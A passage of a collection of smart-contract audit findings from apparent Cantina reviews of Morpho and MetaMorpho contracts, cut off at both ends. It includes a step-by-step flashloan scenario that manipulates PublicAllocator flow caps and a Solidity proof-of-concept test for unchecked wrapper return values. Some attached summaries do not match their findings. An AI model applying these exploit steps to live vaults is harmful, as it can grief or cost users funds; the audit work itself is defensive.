      "content": "## PublicAllocator Overview\n\n### Context\n`PublicAllocator.sol#L128-L131`\n\n### Description\nThe public allocator allows users to move funds in a permissionless manner. However, to prevent undesired states in the MM portfolio, FlowCaps are configured, placing limitations on users' capabilities. One feature of the publicAllocator is to permit users to revert to flow caps in case the portfolio management is suboptimal.\n\nReversing the publicAllocator action does not equate to reversing MM portfolio management, as the portfolios of MM may undergo changes between two publicAllocator actions. \n\nConsider the following configuration of MM and the public allocator:\n\n**Supply Queue**\n| Index | Market         | Current Assets | Cap       |\n|-------|----------------|----------------|-----------|\n| 0     | stETH market   | 1,000,000      | 5,000,000 |\n| 1     | idle market    | 0              | (unlimited) |\n\n**Withdrawal Queue**\n| Index | Market         | Current Assets | Cap       |\n|-------|----------------|----------------|-----------|\n| 0     | idle market    | 0              | (unlimited) |\n| 1     | stETH market   | 1,000,000      | 5,000,000 |\n| 2     | rETH market    | 1,000,000      | 5,000,000 |\n\n**Public Allocator**\n| Market         | Max In       | Max Out      |\n|----------------|--------------|--------------|\n| idle market    | 0            | 10,000,000   |\n| stETH market   | 1,000,000    | 0            |\n| rETH market    | 1,000,000    | 0            |\n\n### Malicious User Exploit Steps\nMalicious users can move funds into the idle market and place the MM in an undesired state with the following steps:\n\n1. **Flashloan and Deposit**  \n   Call `metaMorph.deposit` with 5,000,000 assets.  \n   This fills up the first market (stETH market) and an extra 1,000,000 goes to the idle market.  \n   The users receive 5,000,000 worth of MM shares in this step.\n\n   **States:**\n   \n   **Supply Queue**\n   | Index | Market         | Current Assets | Cap       |\n   |-------|----------------|----------------|-----------|\n   | 0     | stETH market   | 5,000,000      | 5,000,000 |\n   | 1     | idle market    | 1,000,000      | (unlimited) |\n\n   **Withdrawal Queue**\n   | Index | Market         | Current Assets | Cap       |\n   |-------|----------------|----------------|-----------|\n   | 0     | idle market    | 1,000,000      | (unlimited) |\n   | 1     | stETH market   | 5,000,000      | 5,000,000 |\n   | 2     | rETH market    | 1,000,000      | 5,000,000 |\n\n   **Public Allocator**\n   | Market         | Max In       | Max Out      |\n   |----------------|--------------|--------------|\n   | idle market    | 0            | 10,000,000   |\n   | stETH market   | 1,000,000    | 0            |\n   | rETH market    | 1,000,000    | 0            |\n\n2. **Asset Withdrawal**  \n   Let the PublicAllocator withdraw assets from the idle market by calling `publicAllocator.reallocateTo`, with the idle market as the only withdrawal and the rETH market as the supplying market.\n\n   **States:**\n\n   **Supply Queue**\n   | Index | Market         | Current Assets | Cap       |\n   |-------|----------------|----------------|-----------|\n   | 0     | stETH market   | 5,000,000      | 5,000,000 |\n   | 1     | idle market    | 0              | (unlimited) |\n\n   **Withdrawal Queue**\n   | Index | Market         | Current Assets | Cap       |\n   |-------|----------------|----------------|-----------|\n   | 0     | idle market    | 0              | (unlimited) |\n   | 1     | stETH market   | 5,000,000      | 5,000,000 |\n   | 2     | rETH market    | 2,000,000      | 5,000,000 |\n\n   **Public Allocator**\n   | Market         | Max In       | Max Out      |\n   |----------------|--------------|--------------|\n   | idle market    | 1,000,000    | 9,000,000    |\n   | stETH market   | 1,000,000    | 0            |\n   | rETH market    | 0            | 1,000,000    |\n\n3. **Withdraw MM Shares**  \n   Withdraw all MM shares that the exploiter got in the first step. The MM would try to pull 5,000,000 worth of assets. Since there are no assets in the idle markets, MM pulls assets from the second markets in the withdrawal queue, specifically pulling 5,000,000 assets from the stETH market.\n\n   **States:**\n\n   **Supply Queue**\n   | Index | Market         | Current Assets | Cap       |\n   |-------|----------------|----------------|-----------|\n   | 0     | stETH market   | 0              | 5,000,000 |\n   | 1     | idle market    | 0              | (unlimited) |\n\n   **Withdrawal Queue**\n   | Index | Market         | Current Assets | Cap       |\n   |-------|----------------|----------------|-----------|\n   | 0     | idle market    | 0              | (unlimited) |\n   | 1     | stETH market   | 0              | 5,000,000 |\n   | 2     | rETH market    | 2,000,000      | 5,000,000 |\n\n   **Public Allocator**\n   | Market         | Max In       | Max Out      |\n   |----------------|--------------|--------------|\n   | idle market    | 1,000,000    | 9,000,000    |\n   | stETH market   | 1,000,000    | 0            |\n   | rETH market    | 0            | 1,000,000    |\n\n4. **Reverse Cap Flow**  \n   Let the publicAllocator reverse the previous cap flow and move funds out of the idle market.\n\n   **States:**\n\n   **Supply Queue**\n   | Index | Market         | Current Assets | Cap       |\n   |-------|----------------|----------------|-----------|\n   | 0     | stETH market   | 0              | 5,000,000 |\n   | 1     | idle market    | 1,000,000      | (unlimited) |\n\n   **Withdrawal Queue**\n   | Index | Market         | Current Assets | Cap       |\n   |-------|----------------|----------------|-----------|\n   | 0     | idle market    | 0              | (unlimited) |\n   | 1     | stETH market   | 0              | 5,000,000 |\n   | 2     | rETH market    | 1,000,000      | 5,000,000 |\n\n   **Public Allocator**\n   | Market         | Max In       | Max Out      |\n   |----------------|--------------|--------------|\n   | idle market    | 0            | 10,000,000   |\n   | stETH market   | 1,000,000    | 0            |\n   | rETH market    | 0            | 1,000,000    |\n\nIn the above example, the flowCaps remain the same after funds are moved to the idle market. Thus, the exploit still works even with a lower non-zero flowCaps limit. \n\nFor instance, assume the maxOut of the idle market is 500,000, and the exploit steps would be:\n\n1. Deposit 4,500,000 in the first step, letting MM deposit 500,000 into the idle market.\n2. Have the public allocator move 500,000 from the idle market to the rETH market.\n3. Withdraw all shares from MM. At this point, 500,000 assets still exist in the stETH market.\n4. Reverse the cap flow and move funds from rETH to the idle market.\n5. Repeat steps 1 to 4.\n\n### Recommendation\nReallocating funds in the vault has been an open question in DeFi with no optimal solution. The design of MetaMorpho is innovative as it functions both as a lending protocol and a yield-bearing vault. However, this dual role complicates the portfolio management of MetaMorpho compared to a standard yield-bearing vault. In a MetaMorpho vault, the portfolio typically owns the majority of the shares of the underlying markets. Therefore, portfolio management requires extra caution due to its heightened sensitivity.\n\nI recommend imposing more constraints on the publicAllocator, and here are some potential paths:\n\n1. Avoid allowing the reverse of cap flow. Do not increase maxIn when the publicAllocator withdraws from one market, and do not increase maxOut when the publicAllocator supplies to one market.\n2. Set maxIn and maxOut of most markets to 0. For example, in the ETH market, we can mitigate the exploit by setting the maxIn of the rETH market to 0.\n3. Consider charging a higher fee. Its important to note that the exploit can still be profitable even with fees turned on. To nullify the attack vector, fees should be charged in proportion to the funds being moved.\n\nEach of the above solutions comes with trade-offs, and there is no easy solution. I recommend paying close attention to new implementations.\n\n### Discussion\n**Morpho:** Acknowledged. It looks more like grieving than an attack and so the fee should help.  \n**Cantina Managed:** Acknowledged. We should also take care of the underlying market. MM owner should be careful if the vault owns the majority shares of any underlying market.",
      "summary": "\nThe bug report discusses a vulnerability in the public allocator feature of the MetaMorpho protocol. This feature allows users to move funds in the protocol, but to prevent undesired states, flow caps are configured. However, a malicious user can exploit this by moving funds into the idle market and causing the protocol to be in an undesired state. The report suggests potential solutions such as avoiding the reverse of cap flow, setting limits on market maxIn and maxOut, and charging higher fees. The report also mentions the importance of paying attention to new implementations to prevent similar issues in the future.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_public_allocator_feb2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "40731",
      "title": "Natspec documentation issues: missed parameters, typos or suggested updates ",
      "impact": "LOW",
      "content": "## Documentation Issues in MathLib.sol and UtilsLib.sol\n\n## Context\n- MathLib.sol\n- UtilsLib.sol\n\n## Description\nWe have found various NatSpec documentation issues that include missing parameters, typos, or general suggestions for improvement.\n\n- **MathLib.sol**: Some functions are missing the `@notice`, `@param`, and `@return` NatSpec statements.\n- **UtilsLib.sol**: Some functions are missing the `@notice`, `@param`, and `@return` NatSpec statements.\n\nIn general, each struct and enum defined across the project should be supported by the proper NatSpec documentation that has been introduced with Solidity 0.8.20.\n\n## Recommendation\nMorpho should consider fixing all the listed points to provide better NatSpec documentation.\n\n## Morpho\nWe acknowledge this issue.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_blue_irm_feb2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "40730",
      "title": "Consider pre-conguring known integrators market at deployment time to avoid market- squatting ",
      "impact": "LOW",
      "content": "## Fixed Rate IRM Overview\n\n## Context\n**File:** FixedRateIrm.sol  \n**Lines:** 40-L47\n\n## Description\nThe new `FixedRateIrm` allows anyone to call `setBorrowRate(Id id, uint256 newBorrowRate)` and set the `borrowRate` for a market. Given the permissionless nature of this function, it means that anyone could frontrun a valid `setBorrowRate` call by specifying a possible malicious or useless value of `newBorrowRate`.\n\nThis is an issue that is already known to the Morpho team, and it's impossible to solve while also maintaining the permissionless nature of this IRM. Once the `borrowRate` for a market has been set, the only possibility for the market owner is to deploy a new Oracle and generate a new `marketId` to be used.\n\nMorpho has already created some Morpho Blue markets by integrators, and it's possible that these integrators will want to experiment with the new IRM using the same market parameters. The only solution to avoid being frontrunned once the IRM has been deployed is for Morpho to batch the deployment of this IRM with a set of `setBorrowRate` executions using parameters suggested by these integrators.\n\n## Recommendation\nMorpho should consider bundling the deployment of the new IRM with the execution of a series of `setBorrowRate` calls if some of the existing integrators want to provide markets with parameters already used (for the already deployed markets) but with the new IRM.\n\n## Acknowledgements\n**Morpho:** This overhead of the fixed rate IRM is acknowledged, as there is currently no better solution than the one we have (batching Oracle creation and rate setting).  \n**Cantina Managed:** Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_blue_irm_feb2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "40729",
      "title": "High borrowRate values in the new xed rate IRM could lead to user funds stuck in Morpho Blue markets ",
      "impact": "MEDIUM",
      "content": "## Context\n- Morpho.sol#L483-L509\n- FixedRateIrm.sol#L40-L47\n\n## Description\nThe `FixedRateIrm` allows anyone to set a custom fixed arbitrary `borrowRate` for a specified market. The current implementation of `setBorrowRate` reverts only if the specified `newBorrowRate` value is equal to zero or if the market has already been configured with a non-zero borrow rate. This means that an arbitrary value between `1` and `type(uint256).max` is accepted as a valid `borrowRate` for a market.\n\nWhile a very low borrow rate has the only consequence that borrowers will pay a tiny interest (and suppliers will earn a very tiny amount for the money lent), a high value of `borrowRate` will make the Morpho Blue operations for such a market always revert when the `_accrueInterest` function is executed. The `_accrueInterest` can revert when one of the following operations is executed:\n- `wTaylorCompounded` could revert for overflow.\n- `market[id].totalBorrowAssets.wMulDown` could overflow.\n- `interest.toUint128()` could revert if `interest > type(uint128.max)`.\n- Adding interest to `totalBorrowAssets` and `totalSupplyAssets` could revert if interest is big enough to make the sum overflow.\n\nSuch internal function is always called when one of the following functions is executed:\n- `accrueInterest`\n- `setFee`\n- `supply`\n- `withdraw`\n- `borrow`\n- `repay`\n- `withdrawCollateral`\n- `liquidate`\n\nThe only function that does not call `_accrueInterest` is `supplyCollateral`.\n\nLet's assume that `IIrm(marketParams.irm).borrowRate(marketParams, market[id])` returns a `borrowRate` that makes `_accrueInterest` revert. User funds will be stuck forever in the Morpho Blue market in these cases:\n- If a borrower provides collateral by executing `supplyCollateral`. This function never calls `_accrueInterest` and can't revert. The problem in this case is that the borrower won't be able to withdraw his collateral because `withdrawCollateral` will always revert.\n- Any funds supplied to the contract at market creation or, in general, when `elapsed == 0`. After that, suppliers and borrowers have provided loan/collateral tokens, those tokens will not be able to be withdrawn or borrowed because those transactions will revert when `_accrueInterest` is executed.\n\nNote that MetaMorpho Vaults and Bundlers that interact with these reverting markets will also be influenced by these side effects.\n\n## Recommendation\nMorpho should document this possible behavior and evaluate adding lower and upper bounds limits to the value that can be specified as the `newBorrowRate` input parameter of `FixedRateIrm.setBorrowRate` to prevent any Morpho Blue market that uses such IRM from reverting when `_accrueInterest` is executed.\n\n## Morpho\nAddressed in PR 128.\n\n## Cantina Managed\nThe recommendations have been implemented in PR 128. The `FixedRateIrm` now has a max borrow rate equal to the max borrow rate used for the `AdaptiveCurveIrm`.",
      "summary": "\nThe report discusses a bug in the FixedRateIrm contract, which allows for setting a custom fixed borrow rate for a specific market. The current implementation only reverts if the new borrow rate is zero or if the market already has a non-zero borrow rate. This means that any value between 1 and the maximum uint256 value can be set as a valid borrow rate, which can cause problems when executing certain functions. The report recommends implementing upper and lower bounds for the new borrow rate input to prevent markets from reverting when the _accrueInterest function is executed. This issue has been addressed in PR 128.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_blue_irm_feb2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "40727",
      "title": "NatSpec documentation issues: missed parameters, typos or suggested updates ",
      "impact": "LOW",
      "content": "## Context\n- `IPublicAllocator.sol#L12-L14`\n- `IPublicAllocator.sol#L23-L26`\n- `IPublicAllocator.sol#L56`\n\n## Description\nVarious NatSpec documentation issues were found, which include missing parameters, typos, or general suggestions for improvement:\n\n- **IPublicAllocator.sol#L12-L14**: Replace the `170141183460469231731687303715884105727` magic number used to initialize `MAX_SETTABLE_FLOW_CAP` with `type(uint128).max / 2`. Its easier to read and understand, and you don't need to verify it. `170141183460469231731687303715884105727` can still be used as part of the NatSpec documentation.\n  \n- **IPublicAllocator.sol#L23-L26**: Add NatSpec documentation to the `FlowCapsConfig` struct and its attributes.\n  \n- **IPublicAllocator.sol#L56**: Remove the term \"caps\" from the NatSpec documentation (its a reference to outdated code not used anymore).\n\n## Recommendation\nMorpho should consider fixing all the listed points to provide better NatSpec documentation.\n\n## Morpho\nAddressed in PR 29.\n\n## Cantina Managed\nThe recommendations have been implemented in PR 29.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_oracles_feb2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "40726",
      "title": "Add a specic test that uses vaults for both BASE_VAULT and QUOTE_VAULT in MorphoChainlinkO- racleV2Test ",
      "impact": "LOW",
      "content": "## MorphoChainlinkOracleV2Test Overview\n\n## Context\n**File**: MorphoChainlinkOracleV2Test.sol\n\n## Description\nThe `MorphoChainlinkOracleV2Test` test contract covers the test cases when a Vault is passed as an input parameter for the `BASE_VAULT` or `QUOTE_VAULT` internal variables. Currently, there does not exist a test case that covers the scenario when vaults are used for both `BASE_VAULT` and `QUOTE_VAULT`.\n\n## Recommendation\nMorpho should implement and test this specific test case.\n\n## Status\n- **Morpho**: Addressed in PR 85.\n- **Cantina Managed**: The recommended test case has been implemented in PR 85.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_oracles_feb2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "54338",
      "title": "ERC20WrapperBundler calls are missing return value checks ",
      "impact": "MEDIUM",
      "content": "## ERC20WrapperBundler Vulnerability Report\n\n## Context\n- **File**: ERC20WrapperBundler.sol\n- **Lines**: L38, L54\n\n## Description\nThe Morpho Blue bundler offers users the capability to bundle calls, including interactions with contracts that implement the ERC20Wrapper interface. This functionality is facilitated through the `erc20WrapperDepositFor()` and `erc20WrapperWithdrawTo()` functions.\n\nThe current implementation presents a vulnerability as it neglects to check the boolean return value of the underlying ERC20Wrapper functions. While the OpenZeppelin implementation returns `true` for successful calls and reverts on errors, alternative implementations may simply return `false` in case of an unsuccessful call, allowing the call to proceed without reverting. \n\nGiven that the documentation specifies the assumption that the wrapper implements the ERC20Wrapper interface without explicitly detailing the OpenZeppelin functionality, variations in implementation are valid. Consequently, this issue may result in a scenario where a user sends tokens for wrapping to the contract, but the wrapper fails to transfer them out of the bundler (e.g., due to a blocklist) and returns `false`. Since the return value is not checked, the execution continues, leaving the user's tokens within the bundler and vulnerable to theft.\n\nThis issue can lead to a potential loss of user funds as a user will expect the bundler to revert in the case of any of the transferring functions failing, but instead, the bundler will finish the execution, leaving tokens in the bundler. These tokens could then be stolen by anyone.\n\n## Proof of Concept\nTo simulate this issue, a simple ERC20Wrapper that returns `false` on an incorrect deposit instead of reverting has been implemented:\n\n```solidity\nimport {IERC20} from \"../../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol\";\n\ncontract ERC20WrapperNotReverting {\n    IERC20 private immutable _underlying;\n    mapping(address => uint256) public balances;\n\n    constructor(IERC20 underlyingToken) {\n        _underlying = underlyingToken;\n    }\n\n    function underlying() public view returns (IERC20) {\n        return _underlying;\n    }\n\n    /**\n     * @dev Allow a user to deposit underlying tokens and mint the corresponding number of wrapped tokens.\n     */\n    function depositFor(address account, uint256 amount) public virtual returns (bool) {\n        if(msg.sender != address(0x123456)) {\n            // Simulating only dedicated users being allowed to call the function\n            return false;\n        }\n        _underlying.transferFrom(msg.sender, address(this), amount);\n        balances[account] += amount;\n        return true;\n    }\n}\n```\n\nIn the following proof of concept, the issue occurs:\n\n```solidity\nfunction testErc20WrapperDepositForNoRevert() public {\n    // Deploy the non-reverting mock\n    ERC20WrapperNotReverting wrapper2 = new ERC20WrapperNotReverting(loanToken);\n    bundle.push(_erc20WrapperDepositFor(address(wrapper2), 100));\n    loanToken.setBalance(address(bundler), 100);\n    vm.prank(RECEIVER);\n    bundler.multicall(bundle);\n    // Tokens are still left in the contract but it didn't revert\n    assertEq(loanToken.balanceOf(address(bundler)), 100, \"loan.balanceOf(bundler)\");\n    assertEq(loanWrapper.balanceOf(RECEIVER), 0, \"loanWrapper.balanceOf(RECEIVER)\");\n}\n```\n\nThe testcase can be run by:\n1. Adding the `ERC20WrapperNotReverting` contract to the `morpho-blue-bundlers/src/mocks` folder.\n2. Importing it using `import {ERC20WrapperNotReverting} from \"../../src/mocks/ERC20WrapperNotReverting.sol\";`.\n3. Adding the testcase to `morpho-blue-bundlers/test/forge/ERC20WrapperBundlerBundlerLocalTest`.\n4. Running it using `forge test -vvvv --match-test \"testErc20WrapperDepositForNoRevert\"`.\n\n## Recommendation\nMitigate this issue by incorporating return value checks for the calls to the functions `ERC20Wrapper(wrapper).depositFor()` and `ERC20Wrapper(wrapper).withdrawTo()`. The recommended adjustments are as follows:\n\n- **Deposit**:\n  ```solidity\n  bool success = ERC20Wrapper(wrapper).depositFor(initiator(), amount);\n  require(success, \"Deposit was unsuccessful\");\n  ```\n\n- **Withdrawal**:\n  ```solidity\n  bool success = ERC20Wrapper(wrapper).withdrawTo(account, amount);\n  require(success, \"Withdraw was unsuccessful\");\n  ```",
      "summary": "\nThis bug report discusses a vulnerability in the ERC20WrapperBundler contract, specifically in the `erc20WrapperDepositFor()` and `erc20WrapperWithdrawTo()` functions. The issue arises when the contract fails to check the boolean return value of the underlying ERC20Wrapper functions. This can lead to a scenario where a user's tokens are left vulnerable to theft if the wrapper fails to transfer them out of the bundler. A proof of concept is provided to demonstrate the issue and a recommendation is made to mitigate it by incorporating return value checks for these functions. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_competition_morpho_metamorpho_dec2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "J4X98"
      ]
    },
    {
      "id": "54337",
      "title": "Compoundv3migrationbundler is uncapable of withdrawing user 's collateral from the com- pound's instances ",
      "impact": "MEDIUM",
      "content": "## Context\n\n(No context files were provided by the reviewer)\n\nWhen the `CompoundV3MigrationBundler.compoundV3WithdrawFrom()` function is called to attempt to withdraw the user's collateral, the entire execution of the multicall transaction will be reverted because a runtime compilation error will occur when the returned value from the `Compound.userCollateral()` function (a struct) is tried to be assigned to the `balance` variable (uint256). [See the Proof of Concept section for more details]\n\n## Proof of Concept\n\n- The `CompoundV3MigrationBundler` intends to allow users to migrate positions from CompoundV3 to Morpho Blue. One of the functions that users can use to manage their compound's position and move their assets to Morpho Blue is the `compoundV3WithdrawFrom()` function, which allows users to withdraw their assets from Compound. This function enables users to withdraw the user's collateral that was deposited in Compound. \n\nThe problem is that the function `ICompoundV3(instance).userCollateral()` returns a struct instead of a uint. Because the returned value is a struct, when the value is attempted to be assigned to the `balance` variable, a Type Error will occur, reverting all the multicall execution. This failure will prevent users from migrating their assets from Compound to Morpho and will result in users wasting gas on a transaction that always reverts.\n\n- Let's do a walkthrough of the contracts to spot the exact issue:\n\n### CompoundV3MigrationBundler.sol\n\n```solidity\nfunction compoundV3WithdrawFrom(address instance, address asset, uint256 amount) external payable protected {\n    address _initiator = initiator();\n    uint256 balance = asset == ICompoundV3(instance).baseToken()\n        //@audit-ok => Compound.balanceOf() returns a uint256\n        ? ICompoundV3(instance).balanceOf(_initiator)\n        //@audit-issue => Compound.userCollateral() returns a struct, not a uint.\n        //@audit-issue => When trying to assign the returned value to the `balance` variable which is an uint256, it will throw an error about incompatible types\n        : ICompoundV3(instance).userCollateral(_initiator, asset);\n    \n    amount = Math.min(amount, balance);\n    require(amount != 0, ErrorsLib.ZERO_AMOUNT);\n    ICompoundV3(instance).withdrawFrom(_initiator, address(this), asset, amount);\n}\n```\n\n- By examining the code of the CompoundV3 Protocol, we find that the call to `userCollateral()` actually calls a public mapping defined in the `CometStorage.sol` (which is a contract that the main contract inherits from), and this mapping ends up returning a struct.\n\n### CompoundV3 Protocol, CometStorage.sol\n\n```solidity\ncontract CometStorage {\n    // ...\n    //@audit-info => This is the returned Struct when userCollateral() is called!\n    struct UserCollateral {\n        uint128 balance;\n        uint128 _reserved;\n    }\n    // ...\n    //@audit-info => This is the public mapping that is called from the CompoundV3MigrationBundler::compoundV3WithdrawFrom()\n    mapping(address => mapping(address => UserCollateral)) public userCollateral;\n}\n```\n\n- As we have just seen in the previous walkthrough, as a result of not decoding the received struct and merely trying to assign it directly to a variable of type uint256, the entire execution will fail. All changes will be reverted, causing users to lose all the gas spent on the failed execution.\n\n## Recommendation\n\nThe mitigation for this issue is to ensure that the received struct is decoded and the value of the variable `balance` is assigned correctly.\n\n### Updated Code Example\n\n```solidity\nfunction compoundV3WithdrawFrom(address instance, address asset, uint256 amount) external payable protected {\n    address _initiator = initiator();\n    uint256 balance;\n\n    if(asset == ICompoundV3(instance).baseToken()) {\n        balance = ICompoundV3(instance).balanceOf(_initiator);\n    } else {\n        //@audit-ok => Extract the value of the `balance` variable returned from the Compound Contract\n        (uint128 _balance, ) = ICompoundV3(instance).userCollateral(_initiator, asset);\n        balance = uint256(_balance);\n    }\n    \n    amount = Math.min(amount, balance);\n    require(amount != 0, ErrorsLib.ZERO_AMOUNT);\n    ICompoundV3(instance).withdrawFrom(_initiator, address(this), asset, amount);\n}\n```",
      "summary": "\nThe `CompoundV3MigrationBundler` function is not working properly when trying to withdraw assets from Compound to Morpho Blue. This is because the function `ICompoundV3(instance).userCollateral()` returns a struct instead of a uint. This causes a Type Error when trying to assign the value to the `balance` variable, resulting in the entire transaction being reverted. To fix this, the received struct needs to be decoded and the value of the `balance` variable needs to be assigned correctly.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_competition_morpho_metamorpho_dec2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "0xStalin"
      ]
    },
    {
      "id": "54336",
      "title": "Wrong rounding direction for tosupply in _supplymorpho ",
      "impact": "MEDIUM",
      "content": "## Context\n**File:** MetaMorpho.sol  \n**Line:** 807\n\n## Description\nA property that a `_supplyMorpho` call should have is that immediately after the deposit, the supplied assets on the market from Metamorpho do not exceed Metamorpho's `supplyCap`. This means the `toSupply` computation should under-estimate the assets:\n\n```solidity\n(uint256 supplyAssets,,) = _accruedSupplyBalance(marketParams, id);\nuint256 toSupply = UtilsLib.min(supplyCap.zeroFloorSub(supplyAssets), assets);\n```\n\nThis means the `supplyCap.zeroFloorSub(supplyAssets)` should round down, i.e., the `supplyAssets` should round up. However, `supplyAssets` are rounded down. A deposit on Metamorpho can end up immediately breaking its `supplyCap`s.\n\n## Recommendation\nConsider simulating `_accruedSupplyBalance()` but by rounding up the final computation:\n\n```solidity\nassets = shares.toAssetsUp(market.totalSupplyAssets, market.totalSupplyShares);\n```",
      "summary": "\nThe bug report is about an issue in the MetaMorpho.sol file on line 807. The report explains that there is a problem with the `_supplyMorpho` call, where the supplied assets on the market can exceed the `supplyCap` of MetaMorpho. This is because the `toSupply` computation is underestimating the assets and rounding down instead of rounding up. The recommendation is to simulate the `_accruedSupplyBalance()` by rounding up the final computation to fix this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_competition_morpho_metamorpho_dec2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Christoph Michel"
      ]
    },
    {
      "id": "40867",
      "title": "Wrong rounding direction in _maxdeposit ",
      "impact": "MEDIUM",
      "content": "## Context\nMetaMorpho.sol#L651\n\n## Description\nThe `_maxDeposit` should over-estimate the returned `totalSuppliable` assets, as otherwise, when over-estimating, a deposit using this `_maxDeposit` value might revert. This means `totalSuppliable` should round down, which means the `supplyCap.zeroFloorSub(supplyAssets)` term should round down, which means `supplyAssets` should round up. However, `supplyAssets = MORPHO.expectedSupplyAssets(_marketParams(id), address(this))` is rounding down.\n\n## Recommendation\nConsider simulating `MORPHO.expectedSupplyAssets(_marketParams(id), address(this))` but by rounding up.",
      "summary": "\nThe bug report discusses several issues found in the MetaMorpho.sol and ERC20WrapperBundler.sol contracts. These issues include incorrect rounding, missing return value checks, and a vulnerability in the virtual supply shares. These bugs could potentially lead to loss of user funds and should be addressed by the developers. The report also includes recommendations for how to mitigate these issues. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_competition_morpho_metamorpho_dec2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Christoph Michel"
      ]
    },
    {
      "id": "40866",
      "title": "min_rate_at_target is given as apr but morpho blue uses it as apy ",
      "impact": "MEDIUM",
      "content": "## ConstantsLib.sol#L12\n\n## Description\nMorpho Blue is compounding the interest, see [Morpho.sol#L477](https://example.com/Morpho.sol#L477). The `MIN_RATE_AT_TARGET` specified here is given as a value that would result in a 0.1% APR (annual percentage rate, non-compounding). \n\nAs Morpho Blue is compounding, this value must be given such that it results in an APY of 0.1%. We need to compute it the same way as Morpho as:\n\n\\[ e^{nx} - 1 = 0.001 \\]\n\nwhere \\( n = 365 \\) days. Solving for \\( nx \\) gives \\( 0.0009995 \\). Therefore, \\( x = \\text{MAX_RATE_AT_TARGET} = \\frac{0.0009995 \\text{ ether}}{365 \\text{ days}} \\). \n\nThe current value of \\( \\frac{0.001 \\text{ ether}}{365 \\text{ days}} \\) would lead to an actual Morpho Blue APY (yearly compounded interest rate) of:\n\n\\[ e^{0.001} = 0.0010005 = 0.10005\\% \\]\n\nThe desired lower bound of 0.1% cannot be reached.\n\n## Recommendation\nConsider using the correct APY values mentioned above.",
      "summary": "\nThe report states that there is a bug in the ConstantsLib.sol file at line 12. The issue is related to the compounding interest for Morpho Blue. The current MIN_RATE_AT_TARGET value is causing a discrepancy in the annual percentage rate (APR) and the actual APY (yearly compounded interest rate). The APR is currently set at 0.1%, but the desired lower bound of 0.1% cannot be achieved due to the incorrect calculation of the APY. The report recommends using the correct APY values to fix this bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_competition_morpho_metamorpho_dec2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Christoph Michel"
      ]
    },
    {
      "id": "40865",
      "title": "max_rate_at_target is given as apr but morpho blue uses it as apy ",
      "impact": "MEDIUM",
      "content": "## Issue Summary\n\n## Context\n**File:** ConstantsLib.sol#L9\n\n## Description\nMorpho Blue is compounding the interest, see Morpho.sol#L477. The `MAX_RATE_AT_TARGET` specified here is given as a value that would result in a 1e7% APR (annual percentage rate, non-compounding). As Morpho Blue is compounding, this value must be given such that it results in an APY of 1e7%. \n\nWe need to compute it the same way as Morpho does:\n\n\\[ e^{nx} - 1 = 0.01e^9 \\]\n\nwhere \\( n = 365 \\) days. Solving for \\( n \\cdot x = 16.1181 \\), therefore, \n\n\\[ x = \\text{MAX_RATE_AT_TARGET} = \\frac{16.1181 \\, \\text{ether}}{365 \\, \\text{days}} \\]\n\nThe current value of \\( \\frac{1e7 \\, \\text{ether}}{365 \\, \\text{days}} \\) would lead to an actual Morpho Blue APY (yearly compounded interest rate) of \n\n\\[ e^{1e7} = 6.592232534618439 \\times 10^{4342944} \\]\n\nwhich is a number with 4 million digits. \n\nIf an IRM uses this rate, the market would become dysfunctional because of the Morpho computation overflowing already after \n\n\\[ exp(n \\cdot x) - 1 = 560 \\, \\text{seconds} \\]\n\nMarkets using this IRM will revert in the accrual code less than 10 minutes after the last market accrual. Users will be unable to withdraw their funds as the 